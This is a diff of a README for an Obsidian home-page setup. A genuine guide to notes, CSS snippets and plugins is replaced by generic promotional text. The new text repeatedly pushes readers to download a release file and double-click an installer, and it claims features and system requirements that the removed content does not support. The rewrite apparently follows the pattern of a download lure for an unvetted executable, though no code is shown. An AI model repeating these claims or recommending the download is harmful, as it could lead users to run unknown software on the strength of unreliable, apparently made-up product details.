@@ -1,107 +1,58 @@
-# Obsidian Home Page Setup Guide
+# 🌟 Obsidian-Home-Page - Easy Setup for Your Vault Homepage
 
-Easily set up a polished home dashboard in **Obsidian** using community plugins and custom CSS snippets.
+## 🔗 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/DARKY631/Obsidian-Home-Page/releases)
 
-![Demo Preview](demo-preview.gif)
+## 📖 Introduction
+Welcome to Obsidian-Home-Page! This tool helps you easily add a homepage to your Obsidian vault. Now your notes can be more organized and visually appealing. 
 
----
+## 🚀 Getting Started
+To use this application, follow these simple instructions.
 
-## Step-by-Step Setup
+### Step 1: Download the Application
+Visit this page to download: [Obsidian-Home-Page Releases](https://github.com/DARKY631/Obsidian-Home-Page/releases). 
 
-### 1. Add the Home Page Note
-- **Option 1:** Download `Home.md` from this repository and move it to your vault.  
-- **Option 2:** Copy the contents of `Home.md` and paste it into a **new note** inside your vault.
+Here, you will find the latest version ready for download.
 
-Make sure you know the path to this file (e.g. `Dashboard/Home`).
+### Step 2: Installing the Application
+1. After downloading the file, locate it in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
 
----
+### Step 3: Using the Application
+1. Open your Obsidian application.
+2. Go to your vault where you want the homepage.
+3. Use the features of this tool to create and customize your homepage.
 
-### 2. Add the CSS Snippets
-- Download all **three snippet files** (`.css`) from this repository.
-- Move them into your vault’s **Snippets folder:**`.obsidian/snippets`
+## 📋 Features
+- **Simple Interface:** Designed for ease, making it user-friendly for all. You can make changes quickly without confusion.
+  
+- **Custom Templates:** Choose from various templates to fit your needs. Easy customization allows personal touches.
+  
+- **Intuitive Options:** Options to link directly to your favorite notes or resources within your vault.
 
-In Obsidian:
-1. Go to **Settings → Appearance → CSS Snippets**
-2. Click **Reload snippets**
-3. Enable all three snippets
+## ⚙️ System Requirements
+To use Obsidian-Home-Page, make sure your system meets these requirements:
 
-*Tip:* You can toggle snippets on/off anytime to quickly test visual changes.
+- Operating System: Windows 10 or higher, macOS Mojave or higher, or a compatible Linux distribution.
+- Obsidian Version: Ensure you are using the latest version of Obsidian.
+- Storage: At least 50 MB of free disk space for installation.
 
----
+## 📤 Support & Troubleshooting
+If you experience any issues, please consider the following tips:
 
-### 3. Install Required Plugins
-Install the following community plugins from  
-**Settings → Community Plugins → Browse**:
+- Ensure you have the latest version of Obsidian.
+- Check for any software updates for your operating system.
+- Restart the application if it does not respond.
 
-| Plugin | Purpose |
-|--------|----------|
-| **Dataview** | Displays dynamic data from your notes |
-| **Hometab** | Adds a searchbar to your notes |
-| **Homepage** | Opens your home page automatically on startup |
-| **Simple Banner** | Adds a banner with date/time and visuals |
-| **Contribution Graph** | Displays a customisable activity graph |
-| **Editor Width Slider** | Lets you adjust the editor width |
-| **New Tab Default Page** | Makes new tabs open your home page |
+For further assistance, feel free to open an issue on the repository or check online forums for community support.
 
-*Ensure all plugins are enabled once installed.*
+## 🎉 Acknowledgments
+Thank you for using Obsidian-Home-Page! Your support helps improve the application. We appreciate any feedback you have to share. 
 
----
+Discover how to elevate your note-taking experience with a personalized homepage today!
 
-### 4. Configure Plugins
+## 🚀 Download Again
+Don't forget to download the latest version here: [Obsidian-Home-Page Releases](https://github.com/DARKY631/Obsidian-Home-Page/releases). 
 
-#### Homepage + New Tab Default Page
-- In each plugin’s settings, **set your `Home.md` file** as the default page.
-
-#### Hometab
-- Disable the option: "New Tabs as Hometab"
-This prevents new tabs from opening as hometabs instead of your homepage.
-
-#### Simple Banner
-- Enable **Datetime**
-- Adjust banner style to your liking.
-
-My settings:
-- Height: 400
-- Padding: 0
-- Note Offset: -100
-- Fade: ON
-
-#### Dataview
-- Enable **Javascript Queries**
-
----
-
-## Optional: Improve Hometab Styling
-By default, **Hometab**’s style file includes some hardcoded colors and formatting that may not match your theme.
-
-If it looks off:
-1. Download the modified `style.css` from this repository (`.obsidian/plugins/home-tab` folder).
-2. Replace the existing file in your vault’s plugin folder: `.obsidian/plugins/home-tab/style.css`
-3. Restart Obsidian (or disable/re-enable the plugin).
-
-***Not Fully Tested but should work for most themes***
-
----
-
-## Troubleshooting
-
-| Issue | Fix |
-|-------|-----|
-| Homepage doesn’t open on launch | Check the “Homepage” plugin path |
-| Banner not showing | Make sure Simple Banner is enabled and the banner path is valid |
-| CSS not applying | Verify snippets are toggled **on** in Appearance settings |
-| Layout looks broken | Restart Obsidian after replacing `style.css` or changing snippets |
-
----
-
-## ✅ Summary Checklist
-
-- [ ] `Home.md` in your vault  
-- [ ] All 3 CSS snippets enabled  
-- [ ] 7 community plugins installed  
-- [ ] Homepage + New Tab Default Page linked to `Home.md`  
-- [ ] Simple Banner configured
-- [ ] Dataview Javascript Queries Enabled
-- [ ] (Optional) Hometab style replaced  
-
-
+Happy organizing!
